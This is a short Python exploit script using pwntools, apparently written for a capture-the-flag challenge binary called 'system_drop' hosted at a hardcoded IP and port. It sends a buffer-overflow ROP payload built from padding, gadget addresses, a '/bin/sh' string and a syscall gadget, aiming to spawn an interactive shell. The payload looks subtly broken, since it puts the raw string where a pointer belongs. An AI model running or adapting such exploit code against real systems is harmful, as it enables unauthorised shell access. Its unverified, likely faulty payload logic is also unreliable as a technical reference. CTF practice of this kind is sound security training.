
from pwn import *


IP = "139.59.185.150"
port = 31299
context.arch = 'amd64'

alarm = 0x602000
main = 0x400545
base_addr = 0x400000
ret = 0x400416
syscall = 0x400537
pop_rdi = 0x4005d3

binsh = b"/bin/sh\n"

elf = context.binary = ELF("./system_drop")




p = elf.process()
# p = remote(IP, port)

# gdb.attach(p, gdbscript='''b *main+40''')

rop = ROP(elf)

rop.call(elf.sym["main"])


print("binary addr: ", hex(elf.address))
print(hex(elf.got["alarm"]))
print(hex(alarm))


payload = [
    b"A"*40,
    p64(pop_rdi),
    binsh,
    p64(syscall),
    rop.chain()
]
payload = b"".join(payload)

p.sendline(payload)


p.interactive()